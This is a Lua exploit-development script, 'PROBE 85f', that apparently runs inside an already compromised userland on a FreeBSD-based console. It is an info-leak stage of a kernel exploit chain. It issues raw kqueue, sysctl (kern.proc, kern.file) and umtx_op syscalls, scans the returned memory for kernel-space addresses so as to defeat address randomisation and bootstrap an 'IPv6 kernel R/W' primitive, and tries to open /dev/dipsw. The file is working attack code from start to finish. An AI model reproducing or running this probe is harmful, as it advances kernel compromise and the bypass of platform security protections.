-- CRASH_CLASS: LOW
-- PROBE 85f: Hunt for kernel pointer via various info leaks
-- We need ONE kernel pointer to bootstrap the IPv6 kernel R/W

print("=== PROBE 85f ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Method 1: kqueue fd + kevent to leak kernel pointer
print("--- KQUEUE ---")
local kq = to_num(make_syscall(362)()) -- kqueue()
print("kq_fd=" .. kq)

-- Method 2: sysctl kern.proc.pid to get kinfo_proc
-- Look for kernel pointers in ALL fields
print("--- KINFO_PROC ---")
local mib = memory.alloc(16)
memory.write_dword(mib, 1)     -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 1)  -- KERN_PROC_PID
memory.write_dword(mib + 12, pid)
local outbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
memory.write_qword(oldlenp, uint64(0x800))
local ok, ret = pcall(function()
    return make_syscall(202)(uint64(mib), uint64(4), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
print("sysctl ok=" .. tostring(ok) .. " ret=" .. tostring(ret))
if ok and to_num(ret) == 0 then
    local rlen = to_num(memory.read_qword(oldlenp))
    print("len=" .. rlen)
    -- Scan ALL qwords for kernel pointers
    for off = 0, math.min(rlen - 1, 0x7FF), 8 do
        local q = memory.read_qword(outbuf + off)
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print(string.format("KPTR +0x%03X: %s", off, tostring(q)))
        end
    end
end

-- Method 3: Try KERN_FILE (kern.file sysctl)
print("")
print("--- KERN_FILE ---")
mib = memory.alloc(8)
memory.write_dword(mib, 1)    -- CTL_KERN
memory.write_dword(mib + 4, 15) -- KERN_FILE
memory.write_qword(oldlenp, uint64(0x800))
local ok2, ret2 = pcall(function()
    return make_syscall(202)(uint64(mib), uint64(2), uint64(outbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
print("kern.file ok=" .. tostring(ok2) .. " ret=" .. tostring(ret2))
if ok2 and to_num(ret2) == 0 then
    local rlen = to_num(memory.read_qword(oldlenp))
    print("len=" .. rlen)
    for off = 0, math.min(rlen - 1, 0x1FF), 8 do
        local q = memory.read_qword(outbuf + off)
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print(string.format("KPTR +0x%03X: %s", off, tostring(q)))
        end
    end
end

-- Method 4: UMTX op on a shared mutex to leak kernel addresses
-- We know umtx_op(454) works from previous probes
print("")
print("--- UMTX ---")
local umtx_addr = memory.alloc(0x40)
for i = 0, 0x3C, 4 do memory.write_dword(umtx_addr + i, 0) end
-- UMTX_OP_MUTEX_LOCK = 5, then read back
local ok3, ret3 = pcall(function()
    return make_syscall(454)(uint64(umtx_addr), uint64(5), uint64(0),
        uint64(0), uint64(0))
end)
print("umtx5 ok=" .. tostring(ok3) .. " ret=" .. tostring(ret3))
-- Check if kernel wrote any pointers
for off = 0, 0x3C, 8 do
    local q = memory.read_qword(umtx_addr + off)
    local h, l = get_hi_lo(q)
    if h ~= 0 or l ~= 0 then
        print(string.format("umtx+0x%02X: %s", off, tostring(q)))
        if h >= 0xFFFF8000 then print("  *** KERNEL PTR ***") end
    end
end

-- Method 5: Try reading /dev/dipsw
print("")
print("--- DIPSW ---")
local ok4, dfd = pcall(function()
    return syscall.open(uint64(memory.alloc(16)), uint64(0))
end)
-- Actually need to write the string first
local devpath = memory.alloc(32)
local path = "/dev/dipsw"
for i = 1, #path do memory.write_byte(devpath + i - 1, path:byte(i)) end
memory.write_byte(devpath + #path, 0)
local ok5, dfd2 = pcall(function()
    return syscall.open(uint64(devpath), uint64(0))
end)
print("dipsw ok=" .. tostring(ok5) .. " fd=" .. tostring(dfd2))

if kq > 0 then pcall(function() syscall.close(uint64(kq)) end) end

print("=== PROBE 85f COMPLETE ===")
